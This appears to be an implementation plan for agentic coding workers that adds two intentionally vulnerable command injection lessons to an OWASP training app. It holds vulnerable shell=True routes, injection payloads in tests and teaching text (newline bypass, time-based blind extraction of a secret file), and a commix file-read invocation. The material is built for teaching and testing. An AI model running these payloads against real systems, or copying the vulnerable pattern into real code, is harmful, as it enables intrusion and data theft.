# A03 OS Command Injection Deepening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add two new examples to A03's existing OS Command Injection nav
group — a Medium filter-bypass lesson and a Hard blind (no-output)
injection flagship with three graduated tasks — completing the A03
expansion block (sub-project 6's final piece).

**Architecture:** Two new routes in the existing
`app/categories/a03_injection/routes.py`, following the same
`shell=True` + raw f-string interpolation vulnerable pattern already
used by the existing `host_lookup()` route. One new secret file
mirroring the existing `xxe_secret.txt` convention. Two new templates,
one reusing the existing `{% block tasks %}` section from
`example_page_base.html` exactly as-is. Two new nav entries inserted
into the existing "OS Command Injection" group, preserving its required
Easy→Hard sortedness.

**Tech Stack:** Flask, Jinja2, Bootstrap 5 (`collapse` component,
already vendored), pytest + Flask test client, `commix` (cloned from
source for the final Docker-verification task; not a project
dependency).

**Spec:** `docs/superpowers/specs/2026-09-20-owasp-lab-a03-cmd-injection-deepening-design.md`

## Global Constraints

- No change to the existing `command-injection` example
  (`/a03/host-lookup`) or its route/template/tests.
- No change to the shared `{% block tasks %}` base-template mechanism in
  `app/core/templates/core/example_page_base.html` — reuse it exactly as
  built in SQLi-deepening and reused as-is in XSS-deepening.
- The vulnerable pattern in both new routes is exactly raw f-string
  interpolation into a `subprocess.run(..., shell=True, ...)` call,
  matching the existing `host_lookup()` route's established pattern.
- `commix` is a verification TOOL used by Task 3, not a project
  dependency — do not add it to `requirements.txt`, and never install it
  via `pip install commix` (that PyPI package name resolves to an
  unrelated, empty, unofficial package — confirmed during brainstorming).
  The real tool is cloned from `github.com/commixproject/commix` and run
  from source.
- Task 3's exact `commix` invocation for the flagship's Task 3 solution
  text is a genuine open verification step, not a single blind attempt —
  budget real iteration time for it, matching the precedent set by
  SQLi-deepening's `sqlmap` invocation tuning. If the invocation drafted
  in Task 2 doesn't work as-is against the real container, correcting it
  is explicitly pre-authorized as in-scope for Task 3 (commit the fix
  directly, no separate fix-loop round needed).
- Both new examples' `shell=True` payloads use a **short, CI-friendly
  sleep duration in automated tests** (around 1.2s) that is independent
  of the **longer, human-legible sleep durations shown in the page's own
  teaching prose** (3–5s, easier for a person manually testing in a
  browser to perceive). The sleep duration is entirely attacker-supplied
  (never hardcoded in the vulnerable route), so this is not an
  inconsistency to fix — both are valid, deliberately different choices
  for different audiences (an automated test vs. a human reading the
  page).

---

### Task 1: Hostname Lookup Filter Bypass (Medium)

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/filtered_host_lookup.html`
- Create: `tests/test_a03_filtered_host_lookup.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Produces: route `a03_injection.filtered_host_lookup` at
  `POST /a03/filtered-host-lookup` (also accepts GET for the initial
  page load, matching the existing `host_lookup()` route's
  `methods=["GET", "POST"]` pattern); template context `host: str`,
  `output: str | None`, `blocked: bool`.
- Consumes: nothing from later tasks — this task is self-contained.

---

- [ ] **Step 1: Write the failing route-level tests**

Create `tests/test_a03_filtered_host_lookup.py`:

```python
def test_filtered_host_lookup_accepts_a_host(client):
    response = client.post("/a03/filtered-host-lookup", data={"host": "localhost"})
    assert response.status_code == 200
    assert b"Blocked: hostname contains a disallowed character." not in response.data


def test_filtered_host_lookup_blocks_semicolon(client):
    response = client.post(
        "/a03/filtered-host-lookup", data={"host": "localhost;echo BLOCKED_PROOF"}
    )
    assert response.status_code == 200
    assert b"Blocked: hostname contains a disallowed character." in response.data
    assert b"BLOCKED_PROOF" not in response.data


def test_filtered_host_lookup_blocks_ampersand(client):
    response = client.post(
        "/a03/filtered-host-lookup", data={"host": "localhost&echo BLOCKED_PROOF"}
    )
    assert response.status_code == 200
    assert b"Blocked: hostname contains a disallowed character." in response.data
    assert b"BLOCKED_PROOF" not in response.data


def test_filtered_host_lookup_blocks_pipe(client):
    response = client.post(
        "/a03/filtered-host-lookup", data={"host": "localhost|echo BLOCKED_PROOF"}
    )
    assert response.status_code == 200
    assert b"Blocked: hostname contains a disallowed character." in response.data
    assert b"BLOCKED_PROOF" not in response.data


def test_filtered_host_lookup_newline_bypasses_the_blacklist(client):
    # The blacklist checks only ";", "&", "|" -- a literal newline is
    # never checked for, and /bin/sh treats it exactly like a semicolon.
    response = client.post(
        "/a03/filtered-host-lookup",
        data={"host": "localhost\necho NEWLINE_BYPASS_PROOF"},
    )
    assert response.status_code == 200
    assert b"Blocked: hostname contains a disallowed character." not in response.data
    assert b"NEWLINE_BYPASS_PROOF" in response.data


def test_filtered_host_lookup_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/filtered-host-lookup",
        data={"host": "localhost\necho NEWLINE_BYPASS_PROOF"},
    )
    assert response.status_code == 200
    assert b"NEWLINE_BYPASS_PROOF" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_filtered_host_lookup_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Hostname Lookup Filter Bypass" in response.data
    assert b'href="/a03/filtered-host-lookup"' in response.data
```

The `app` and `client` fixtures come from the project's existing
`conftest.py` (same fixtures every other A03 test file uses).

- [ ] **Step 2: Run the new tests to verify they fail**

Run: `pytest tests/test_a03_filtered_host_lookup.py -v`
Expected: every test fails with a 404 (the route doesn't exist yet).

- [ ] **Step 3: Add the vulnerable route**

In `app/categories/a03_injection/routes.py`, add the following after the
existing `filter_challenge()` route (the current end of the file):

```python
@a03_bp.route("/filtered-host-lookup", methods=["GET", "POST"])
def filtered_host_lookup():
    host = ""
    output = None
    blocked = False
    if request.method == "POST":
        host = request.form.get("host", "")
        if any(bad in host for bad in (";", "&", "|")):
            blocked = True
        else:
            # VULNERABLE: blacklist checks only ";", "&", "|" -- a literal
            # newline is just as good a command separator to /bin/sh and
            # isn't checked for at all
            result = subprocess.run(
                f"getent hosts {host}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )
            output = result.stdout or result.stderr or "(no output)"
    return render_template(
        "a03_injection/filtered_host_lookup.html",
        host=host,
        output=output,
        blocked=blocked,
    )
```

- [ ] **Step 4: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/filtered_host_lookup.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Hostname Lookup Filter Bypass" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This version of the hostname lookup tool adds a filter before shelling
  out: it rejects the input outright if it contains a semicolon
  (<code>;</code>), ampersand (<code>&amp;</code>), or pipe
  (<code>|</code>) — the three most obvious shell command separators.
  Once past that check, the input is still concatenated directly into a
  <code>shell=True</code> call with no other protection.
</p>
{% endblock %}

{% block detect %}
<p>
  Try <code>localhost;echo test</code> first — it's rejected outright, so
  the filter is clearly doing something. Then try the same idea with a
  literal newline in place of the semicolon (the input below is a text
  area, so you can type one directly) — a very different result.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Submit <code>localhost;echo test</code> — blocked, confirming the
      filter checks for at least a semicolon.</li>
  <li>Submit a hostname followed by a literal newline and a second
      command, e.g. <code>localhost</code> then a newline then
      <code>whoami</code> in the same field.</li>
  <li>The filter's blacklist never checks for a newline character — and
      <code>/bin/sh</code> treats a newline exactly like a semicolon,
      terminating one command and starting the next. The second
      command's output appears in the response.</li>
</ol>
<p>
  Blacklists that enumerate "the obvious" metacharacters are a common,
  genuinely dangerous real-world pattern: every shell metacharacter left
  off the list — newlines, backticks, <code>$(...)</code>, even a bare
  space combined with certain built-ins — is a complete bypass, not a
  partial one. A blacklist has to be perfect to work at all; an allowlist
  (or, better, never invoking a shell with untrusted input in the first
  place) doesn't have this problem.
</p>
{% endblock %}

{% block vulnerable_code %}if any(bad in host for bad in (";", "&", "|")):
    blocked = True
else:
    result = subprocess.run(
        f"getent hosts {host}",
        shell=True,
        capture_output=True,
        text=True,
        timeout=10,
    )
{% endblock %}

{% block secure_code %}# Don't blacklist shell metacharacters -- never invoke a shell with
# untrusted input in the first place:
result = subprocess.run(
    ["getent", "hosts", host],
    shell=False,
    capture_output=True,
    text=True,
    timeout=10,
)
{% endblock %}

{% block live_example %}
<form method="post" class="mb-3">
  <div class="mb-2">
    <textarea class="form-control" name="host" rows="2" placeholder="e.g. localhost">{{ host }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Look up</button>
</form>
{% if blocked %}
<p class="text-danger">Blocked: hostname contains a disallowed character.</p>
{% endif %}
{% if output is not none %}
<pre>{{ output }}</pre>
{% endif %}
{% endblock %}
```

(A `<textarea>` is used instead of a single-line `<input>` so a learner
can actually type a literal newline through the browser form itself.)

- [ ] **Step 5: Run the new tests to verify they pass**

Run: `pytest tests/test_a03_filtered_host_lookup.py -v`
Expected: all tests PASS except the overview/registration test, which
still fails until Step 6 registers the nav entry.

- [ ] **Step 6: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, insert a new `ExampleNav`
immediately *before* the existing `command-injection` entry:

```python
            ExampleNav(
                id="filtered-host-lookup",
                title="Hostname Lookup Filter Bypass",
                group="OS Command Injection",
                difficulty="Medium",
                endpoint="a03_injection.filtered_host_lookup",
            ),
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
            ),
```

(The `command-injection` entry already exists — only the
`filtered-host-lookup` block before it is new.)

- [ ] **Step 7: Update `tests/test_a03_overview.py`'s nav-list assertions**

Replace the `test_a03_registered_in_nav` function's difficulty-list
assertion with the updated 16-entry list (a new `"Medium"` inserted at
position 8, for the new `filtered-host-lookup` entry landing immediately
before `command-injection`):

```python
def test_a03_registered_in_nav(app):
    from app.core.nav import CATEGORIES

    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    assert a03.short_id == "A03"
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

Replace the `test_a03_examples_grouped_by_vulnerability_subtype`
function's OS Command Injection-group assertion (the rest of the
function is unchanged):

```python
def test_a03_examples_grouped_by_vulnerability_subtype(app):
    from app.core.nav import CATEGORIES

    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    grouped = a03.grouped_examples()
    assert [name for name, _ in grouped] == [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "OS Command Injection",
        "XML External Entity Injection (XXE)",
        "Server-Side Template Injection (SSTI)",
        "LDAP Injection",
    ]
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "blind-sqli",
        "roster-lookup",
    ]
    assert [e.id for e in grouped[1][1]] == [
        "reflected-xss",
        "stored-xss",
        "filter-challenge",
    ]
    assert [e.id for e in grouped[2][1]] == [
        "filtered-host-lookup",
        "command-injection",
    ]
    assert [e.id for e in grouped[3][1]] == ["xml-import", "xxe-ssrf"]
    assert [e.id for e in grouped[4][1]] == ["ssti-email-preview", "ssti-blacklist-bypass"]
    assert [e.id for e in grouped[5][1]] == ["ldap-directory-login", "ldap-directory-search"]
    difficulty_rank = {"Easy": 0, "Medium": 1, "Hard": 2}
    for _, examples in grouped:
        ranks = [difficulty_rank[e.difficulty] for e in examples]
        assert ranks == sorted(ranks), "group examples must be Easy-to-Hard"
```

- [ ] **Step 8: Run the full test suite**

Run: `pytest -v`
Expected: all tests PASS.

- [ ] **Step 9: Commit**

```bash
git add app/categories/a03_injection/routes.py \
        app/categories/a03_injection/__init__.py \
        app/categories/a03_injection/templates/a03_injection/filtered_host_lookup.html \
        tests/test_a03_filtered_host_lookup.py \
        tests/test_a03_overview.py
git commit -m "feat: add A03 Hostname Lookup Filter Bypass command injection example (Medium)"
```

---

### Task 2: Blind Command Injection via Report Generator (Hard, flagship)

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/cmd_secret.txt`
- Create: `app/categories/a03_injection/templates/a03_injection/generate_report.html`
- Create: `tests/test_a03_generate_report.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: nothing from Task 1 — this task is independent of it (both
  touch the same nav list and overview test file, but at different,
  non-overlapping insertion points; Task 1 must land first only because
  this task's plan text is written assuming Task 1's `filtered-host-lookup`
  entry already exists at position 8).
- Produces: route `a03_injection.generate_report` at
  `POST /a03/generate-report` (also accepts GET); module-level constant
  `CMD_SECRET_PATH` in `app/categories/a03_injection/routes.py`; template
  context `report_name: str`, `submitted: bool`, `secret_path: str`.

---

- [ ] **Step 1: Create the secret file**

Create `app/categories/a03_injection/cmd_secret.txt`:

```
K7QXTP-prod-signing-key
```

(A single line. Its first character, `K`, is ASCII value 75 — this exact
value is what Task 2's test and the page's own Task 2 walkthrough both
recover via blind extraction.)

- [ ] **Step 2: Write the failing route-level tests**

Create `tests/test_a03_generate_report.py`:

```python
import time

from app.categories.a03_injection.routes import CMD_SECRET_PATH


def test_generate_report_legitimate_submission_returns_standard_response(client):
    response = client.post("/a03/generate-report", data={"report_name": "quarterly"})
    assert response.status_code == 200
    assert b"Your report is being generated. Check back later." in response.data


def test_generate_report_confirms_blind_execution_via_timing(client):
    start = time.monotonic()
    client.post("/a03/generate-report", data={"report_name": "baseline"})
    baseline_elapsed = time.monotonic() - start

    start = time.monotonic()
    response = client.post(
        "/a03/generate-report", data={"report_name": "x; sleep 1.2 #"}
    )
    injected_elapsed = time.monotonic() - start

    assert response.status_code == 200
    # the response text is identical either way -- only timing differs
    assert b"Your report is being generated. Check back later." in response.data
    assert injected_elapsed - baseline_elapsed > 0.8


def test_generate_report_blind_extraction_recovers_secret_first_byte(client):
    # Binary-search the ASCII value of the secret file's first character
    # using ONLY response timing as the oracle -- proving the route
    # genuinely leaks file content one bit at a time with zero output
    # ever shown, matching this project's established "prove it for
    # real, through the actual HTTP-level route" discipline. The
    # `printf %d \'X` construct is a POSIX shell trick for getting a
    # character's ordinal (ASCII) value -- live-verified during this
    # plan's brainstorming against this exact machine's /bin/sh.
    low, high = 0, 255
    while low < high:
        mid = (low + high) // 2
        payload = (
            f"x; [ $(printf %d \\'$(head -c1 {CMD_SECRET_PATH})) -gt {mid} ] "
            f"&& sleep 1.2 #"
        )
        start = time.monotonic()
        client.post("/a03/generate-report", data={"report_name": payload})
        elapsed = time.monotonic() - start
        if elapsed > 0.8:
            low = mid + 1
        else:
            high = mid
    assert low == 75  # ASCII 'K', the secret file's first character


def test_generate_report_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post("/a03/generate-report", data={"report_name": "quarterly"})
    assert response.status_code == 200
    assert b"Your report is being generated. Check back later." in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data
    assert b"Tasks" not in response.data


def test_generate_report_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Blind Command Injection via Report Generator" in response.data
    assert b'href="/a03/generate-report"' in response.data
```

The `test_generate_report_blind_extraction_recovers_secret_first_byte`
test will take several real seconds to run (it performs 8 real HTTP
requests through the Flask test client, roughly half of which trigger a
genuine 1.2-second `subprocess.run` delay) — this is expected and
correct, not a bug to fix; the technique being tested is inherently
time-based.

- [ ] **Step 3: Run the new tests to verify they fail**

Run: `pytest tests/test_a03_generate_report.py -v`
Expected: collection fails outright with
`ImportError: cannot import name 'CMD_SECRET_PATH'` — the test file
imports it at module level, and Step 4 hasn't added it to `routes.py`
yet. This counts as the expected RED state for this step (every test in
the file fails to even run), not a per-test 404.

- [ ] **Step 4: Add the vulnerable route**

In `app/categories/a03_injection/routes.py`, add a new module-level
constant near the top of the file, next to the existing
`XXE_SECRET_PATH` constant:

```python
XXE_SECRET_PATH = os.path.join(os.path.dirname(__file__), "xxe_secret.txt")
CMD_SECRET_PATH = os.path.join(os.path.dirname(__file__), "cmd_secret.txt")
```

Then add the following at the end of the file, after the
`filtered_host_lookup()` route added in Task 1:

```python
@a03_bp.route("/generate-report", methods=["GET", "POST"])
def generate_report():
    report_name = ""
    submitted = False
    if request.method == "POST":
        report_name = request.form.get("report_name", "")
        # VULNERABLE: raw string-concatenated shell command, output
        # discarded -- the response text below is identical no matter
        # what happens, so the ONLY signal available is how long the
        # request took to complete
        subprocess.run(
            f"touch /tmp/report_{report_name}.pdf",
            shell=True,
            capture_output=True,
            text=True,
            timeout=15,
        )
        submitted = True
    return render_template(
        "a03_injection/generate_report.html",
        report_name=report_name,
        submitted=submitted,
        secret_path=CMD_SECRET_PATH,
    )
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/generate_report.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Blind Command Injection via Report Generator" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "generate my report" feature shells out to create a file named
  after your input, with <code>shell=True</code> and no parameterization
  — but unlike every other example in this project, it never shows you
  any output at all. The response text is exactly the same whether the
  command succeeded, failed, or did something else entirely. The only
  thing that can possibly differ between two requests is how long they
  take to complete.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit an ordinary report name first — the response is instant. Then
  submit <code>x; sleep 5 #</code> as the report name. If the response
  now takes about five seconds longer, your input is reaching a real
  shell and you've confirmed command execution with zero visible output
  — a purely <strong>blind</strong> injection point.
</p>
{% endblock %}

{% block exploitation %}
<p>
  A timing difference is a real signal, and like any blind oracle it can
  be turned into a way to read data you're never shown. See the Tasks
  below, which walk through this step by step, from a single timing
  probe to extracting one real byte of a server-side secret file by
  hand, to fully automated extraction.
</p>
{% endblock %}

{% block tasks %}
<ol class="list-unstyled">
  <li class="mb-4">
    <strong>Task 1: Confirm blind execution with a single timing
    probe.</strong>
    <p>Submit a report name that should return instantly, then one that
    should take several seconds, and confirm the delay is real.</p>
    <button class="btn btn-sm btn-outline-secondary" type="button"
            data-bs-toggle="collapse" data-bs-target="#task1-solution">
      Show solution
    </button>
    <div class="collapse mt-2" id="task1-solution">
      <div class="card card-body">
        <p>Submit <code>report</code> — instant. Submit
        <code>x; sleep 5 #</code> — the response takes about five
        seconds longer, even though the two responses look
        byte-for-byte identical. The delay itself is the only signal
        you need.</p>
      </div>
    </div>
  </li>
  <li class="mb-4">
    <strong>Task 2: Extract one real byte by hand — the first character
    of a secret file on the server — using only response timing.</strong>
    <p>The server has a file at <code>{{ secret_path }}</code>. You
    can't read it directly, but you can ask yes/no questions about its
    first byte and binary-search your way to the exact value.</p>
    <button class="btn btn-sm btn-outline-secondary" type="button"
            data-bs-toggle="collapse" data-bs-target="#task2-solution">
      Show solution
    </button>
    <div class="collapse mt-2" id="task2-solution">
      <div class="card card-body">
        <p>Submit report names shaped like
        <code>x; [ $(printf %d \'$(head -c1 {{ secret_path }})) -gt 128 ] &amp;&amp; sleep 3 #</code>
        — if the response is slow, the first character's ASCII value is
        above 128; if it's instant, it isn't. Halve the range each time
        (64, then 32 or 96, and so on) and within about 8 requests
        you'll pin down the exact value: <strong>75</strong>, which is
        the letter <strong>K</strong>.</p>
      </div>
    </div>
  </li>
  <li class="mb-4">
    <strong>Task 3: Extract the entire secret file. This one genuinely
    requires automated tooling.</strong>
    <p>Task 2 took about 8 requests for ONE byte. A real secret is many
    bytes long, and each one needs its own binary search. Doing this by
    hand for a whole file would take an impractically large number of
    requests — which is exactly why tools like <code>commix</code>
    exist: point it at the injection point and let it enumerate the
    file's contents unattended.</p>
    <button class="btn btn-sm btn-outline-secondary" type="button"
            data-bs-toggle="collapse" data-bs-target="#task3-solution">
      Show solution
    </button>
    <div class="collapse mt-2" id="task3-solution">
      <div class="card card-body">
        <p>From a shell with <code>commix</code> available (cloned from
        <code>github.com/commixproject/commix</code> and run from
        source — it is not distributed on PyPI):</p>
        <pre><code class="language-python">python3 commix.py -u "http://127.0.0.1:5001/a03/generate-report" \
  --data="report_name=x" --batch --technique=T \
  --file-read={{ secret_path }}</code></pre>
        <p>Within a couple of minutes, commix recovers the entire file
        contents on its own — the same data Task 2 took ~8 requests to
        extract just one byte of.</p>
      </div>
    </div>
  </li>
</ol>
{% endblock %}

{% block vulnerable_code %}subprocess.run(
    f"touch /tmp/report_{report_name}.pdf",
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
# response text below is identical no matter what happened -- timing
# is the only signal an attacker has
{% endblock %}

{% block secure_code %}subprocess.run(
    ["touch", f"/tmp/report_{report_name}.pdf"],
    shell=False,
    capture_output=True,
    text=True,
    timeout=15,
)
{% endblock %}

{% block live_example %}
<form method="post" class="mb-3">
  <div class="input-group">
    <input type="text" class="form-control" name="report_name" value="{{ report_name }}" placeholder="Report name">
    <button type="submit" class="btn btn-primary">Generate</button>
  </div>
</form>
{% if submitted %}
<p>Your report is being generated. Check back later.</p>
{% endif %}
{% endblock %}
```

Note: `{{ secret_path }}` in the Task 2/3 solution text and in the route
itself is a real, evaluated Jinja expression (not illustrative static
text needing `{% raw %}` protection) — it deliberately shows the actual
runtime filesystem path, matching the existing XXE example's
`xml_import.html` convention of embedding `{{ secret_path }}` directly.
The literal `&&` inside Task 2's solution paragraph IS static
illustrative text and must stay HTML-entity-escaped as `&amp;&amp;`,
matching `host_lookup.html`'s existing convention for showing `&&` as
readable text.

- [ ] **Step 6: Run the new tests to verify they pass**

Run: `pytest tests/test_a03_generate_report.py -v`
Expected: all tests PASS except the overview/registration test, which
still fails until Step 7 registers the nav entry. Note the blind
extraction test's real ~5-8 second runtime (see Step 2 note above).

- [ ] **Step 7: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, insert a new `ExampleNav`
immediately *after* the existing `command-injection` entry (which Task 1
already left immediately after the new `filtered-host-lookup` entry):

```python
            ExampleNav(
                id="command-injection",
                title="OS Command Injection in Host Lookup Tool",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.host_lookup",
            ),
            ExampleNav(
                id="blind-report-injection",
                title="Blind Command Injection via Report Generator",
                group="OS Command Injection",
                difficulty="Hard",
                endpoint="a03_injection.generate_report",
            ),
```

(The `command-injection` entry already exists — only the
`blind-report-injection` block after it is new.)

- [ ] **Step 8: Update `tests/test_a03_overview.py`'s nav-list assertions**

Replace the `test_a03_registered_in_nav` function's difficulty-list
assertion with the updated 17-entry list (a new `"Hard"` inserted at
position 10, for the new `blind-report-injection` entry landing
immediately after `command-injection`):

```python
def test_a03_registered_in_nav(app):
    from app.core.nav import CATEGORIES

    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    assert a03.short_id == "A03"
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

Replace the `test_a03_examples_grouped_by_vulnerability_subtype`
function's OS Command Injection-group assertion (the rest of the
function is unchanged from Task 1's version):

```python
def test_a03_examples_grouped_by_vulnerability_subtype(app):
    from app.core.nav import CATEGORIES

    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    grouped = a03.grouped_examples()
    assert [name for name, _ in grouped] == [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "OS Command Injection",
        "XML External Entity Injection (XXE)",
        "Server-Side Template Injection (SSTI)",
        "LDAP Injection",
    ]
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "blind-sqli",
        "roster-lookup",
    ]
    assert [e.id for e in grouped[1][1]] == [
        "reflected-xss",
        "stored-xss",
        "filter-challenge",
    ]
    assert [e.id for e in grouped[2][1]] == [
        "filtered-host-lookup",
        "command-injection",
        "blind-report-injection",
    ]
    assert [e.id for e in grouped[3][1]] == ["xml-import", "xxe-ssrf"]
    assert [e.id for e in grouped[4][1]] == ["ssti-email-preview", "ssti-blacklist-bypass"]
    assert [e.id for e in grouped[5][1]] == ["ldap-directory-login", "ldap-directory-search"]
    difficulty_rank = {"Easy": 0, "Medium": 1, "Hard": 2}
    for _, examples in grouped:
        ranks = [difficulty_rank[e.difficulty] for e in examples]
        assert ranks == sorted(ranks), "group examples must be Easy-to-Hard"
```

- [ ] **Step 9: Run the full test suite**

Run: `pytest -v`
Expected: all tests PASS (the suite will take roughly 5-8 seconds longer
than Task 1's checkpoint, due to the new blind-extraction test's real
timing delays — expected, not a regression).

- [ ] **Step 10: Commit**

```bash
git add app/categories/a03_injection/routes.py \
        app/categories/a03_injection/__init__.py \
        app/categories/a03_injection/cmd_secret.txt \
        app/categories/a03_injection/templates/a03_injection/generate_report.html \
        tests/test_a03_generate_report.py \
        tests/test_a03_overview.py
git commit -m "feat: add A03 blind command injection example with multi-task pattern and commix task (Hard)"
```

---

### Task 3: Docker verification

**Files:** none modified except possibly
`app/categories/a03_injection/templates/a03_injection/generate_report.html`
(only its Task 3 solution's `commix` invocation, if the drafted one in
Task 2 doesn't work as-is against the real container).

**Interfaces:**
- Consumes: the full working app from Tasks 1-2 running in Docker.
- Produces: nothing new — this task only verifies and, if needed,
  corrects the exact `commix` invocation already drafted in Task 2.

---

- [ ] **Step 1: Bring up the Docker stack**

```bash
docker compose up -d --build
```

Wait for the `app` service to become healthy (it depends on `postgres`
and `ldap`'s healthchecks). Confirm with:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:5001/a03/
```

Expected: `200`.

- [ ] **Step 2: Verify the Hostname Lookup Filter Bypass against the real container**

```bash
curl -s -X POST http://127.0.0.1:5001/a03/filtered-host-lookup \
  --data-urlencode "host=localhost;echo BLOCKED_PROOF"
```

Expected: the response contains "Blocked: hostname contains a
disallowed character." and does NOT contain `BLOCKED_PROOF`.

```bash
curl -s -X POST http://127.0.0.1:5001/a03/filtered-host-lookup \
  --data-urlencode $'host=localhost\necho NEWLINE_BYPASS_PROOF'
```

Expected: the response does NOT contain the blocked message and DOES
contain `NEWLINE_BYPASS_PROOF`. If either check fails, investigate
before proceeding — this must genuinely work against the real container,
not just the local pytest environment.

- [ ] **Step 3: Verify the blind timing oracle against the real container**

```bash
time curl -s -X POST http://127.0.0.1:5001/a03/generate-report \
  --data-urlencode "report_name=baseline" > /dev/null

time curl -s -X POST http://127.0.0.1:5001/a03/generate-report \
  --data-urlencode "report_name=x; sleep 3 #" > /dev/null
```

Expected: the second `time` measurement is genuinely ~3 seconds longer
than the first, confirming the timing oracle works through the real
network/WSGI stack (not just Flask's in-process test client).

- [ ] **Step 4: Verify the manual binary-search extraction against the real container**

The container's `/bin/sh` may differ from the local development
machine's (the app image is `python:3.12-slim`, a Debian base, whose
`/bin/sh` is typically `dash`, not the shell used during this plan's
local pytest runs) — the `printf %d \'X` ordinal-value trick is
POSIX-standard and expected to work identically, but this step
genuinely confirms it rather than assuming it. Write a small script (in
the worktree, not committed — this is a one-off verification, not a
project file) that repeats the same binary-search loop as
`test_generate_report_blind_extraction_recovers_secret_first_byte` but
using `requests` (or `curl` + `time` in a loop) against
`http://127.0.0.1:5001/a03/generate-report` instead of the Flask test
client, targeting the *container's* `CMD_SECRET_PATH` — visit
`http://127.0.0.1:5001/a03/generate-report` in a browser or via `curl`
first and read the real path out of the rendered Task 2 solution text
(it will be something under `/app/app/categories/a03_injection/`, since
the Dockerfile's `WORKDIR` is `/app`).

Expected: the script recovers ASCII value `75` (`K`), confirming the
technique works identically against the real container. If it does not
(e.g. the container's shell handles the `printf` trick differently),
stop and investigate — this is exactly the kind of environment-specific
discrepancy Docker verification exists to catch, matching the precedent
of SQLi-deepening's `sqlmap` schema-vs-database-name discovery.

- [ ] **Step 5: Determine and verify the working `commix` invocation**

Clone commix if not already available in this environment:

```bash
git clone --depth 1 https://github.com/commixproject/commix.git /tmp/commix-verify
```

If running the cloned tool is blocked by a sandbox or permission
restriction in this execution environment, **stop and ask the user for
permission before proceeding** — do not skip this verification silently,
and do not substitute an unverified guess for the template's Task 3
solution text.

Run the invocation already drafted in Task 2's template against the real
container, using the real in-container secret path discovered in Step 4:

```bash
cd /tmp/commix-verify
python3 commix.py -u "http://127.0.0.1:5001/a03/generate-report" \
  --data="report_name=x" --batch --technique=T \
  --file-read=<real in-container CMD_SECRET_PATH from Step 4>
```

If this invocation successfully extracts the exact contents of
`cmd_secret.txt` (`K7QXTP-prod-signing-key`), the drafted invocation in
`generate_report.html`'s Task 3 solution is already correct — no
template change needed.

If it does not work as drafted (e.g. `--technique=T` needs a different
value, `--level` needs raising, or the timing detection needs tuning via
`--time-sec`), iterate on the invocation until one genuinely works, then
update `generate_report.html`'s Task 3 solution `<pre><code>` block (and
only that block) to the exact working invocation. This correction is
explicitly pre-authorized as in-scope for this task per the plan's
Global Constraints — commit it directly, no separate fix-loop round
needed.

Clean up the verification clone:

```bash
rm -rf /tmp/commix-verify
```

- [ ] **Step 6: Run the full test suite one more time**

```bash
pytest -v
```

Expected: all tests PASS (same count as Task 2's checkpoint — this task
makes no test changes, only possibly a template correction).

- [ ] **Step 7: Commit (only if Step 5 required a template correction)**

If Step 5 found the drafted `commix` invocation already worked, there is
nothing to commit for this task — skip this step.

If Step 5 required correcting the invocation:

```bash
